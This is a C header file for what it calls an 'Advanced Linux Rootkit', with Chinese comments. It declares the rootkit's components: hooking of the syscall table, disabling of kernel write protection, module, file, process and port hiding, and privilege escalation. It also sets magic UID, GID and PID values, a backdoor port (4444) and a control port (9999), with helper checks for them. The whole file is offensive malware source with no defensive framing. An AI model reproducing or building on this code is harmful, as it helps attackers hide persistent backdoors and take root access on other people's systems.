/*
 * Advanced Linux Rootkit - Common Header
 * Shared definitions and interfaces for all modules
 */

#ifndef _ROOTKIT_H
#define _ROOTKIT_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/inet.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/signal.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/socket.h>
#include <linux/in.h>
#include <linux/net.h>
#include <net/sock.h>

// 条件包含dirent.h以避免重复定义
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
#include <linux/dirent.h>
#endif

// 通用定义
#define MODULE_NAME "rootkit"
#define HIDE_PREFIX "rk_"
#define PROC_ENTRY "rootkit_control"
#define MAGIC_UID 31337
#define MAGIC_GID 31337
#define MAGIC_PID 31337
#define MAGIC_PORT_START 31337
#define MAGIC_PORT_END 31400
#define BACKDOOR_PORT 4444
#define CONTROL_PORT 9999

// 全局变量声明
extern unsigned long *sys_call_table;

// 全局函数声明
extern void disable_write_protection(void);
extern void enable_write_protection(void);

// 模块初始化和清理函数声明
extern int init_module_hiding(void);
extern void cleanup_module_hiding(void);
extern int init_privilege_escalation(void);
extern void cleanup_privilege_escalation(void);
extern int init_file_hiding(void);
extern void cleanup_file_hiding(void);
extern int init_process_hiding(void);
extern void cleanup_process_hiding(void);
extern int init_port_hiding(void);
extern void cleanup_port_hiding(void);

// 通用数据结构
// 只在内核版本小于5.6时定义linux_dirent64结构体
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};
#endif

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

// 工具函数
static inline int is_magic_uid(void) {
    return (current_uid().val == MAGIC_UID || current_gid().val == MAGIC_GID);
}

static inline int is_magic_pid(pid_t pid) {
    return (pid == MAGIC_PID);
}

static inline int is_magic_port(unsigned short port) {
    return (port >= MAGIC_PORT_START && port <= MAGIC_PORT_END) || 
           (port == BACKDOOR_PORT) || (port == CONTROL_PORT);
}

// 调试宏
#ifdef DEBUG
#define ROOTKIT_DEBUG(fmt, ...) printk(KERN_DEBUG "[%s] " fmt, MODULE_NAME, ##__VA_ARGS__)
#else
#define ROOTKIT_DEBUG(fmt, ...) do {} while(0)
#endif

#define ROOTKIT_INFO(fmt, ...) printk(KERN_INFO "[%s] " fmt, MODULE_NAME, ##__VA_ARGS__)
#define ROOTKIT_ERR(fmt, ...) printk(KERN_ERR "[%s] " fmt, MODULE_NAME, ##__VA_ARGS__)
#define ROOTKIT_WARN(fmt, ...) printk(KERN_WARNING "[%s] " fmt, MODULE_NAME, ##__VA_ARGS__)

#endif /* _ROOTKIT_H */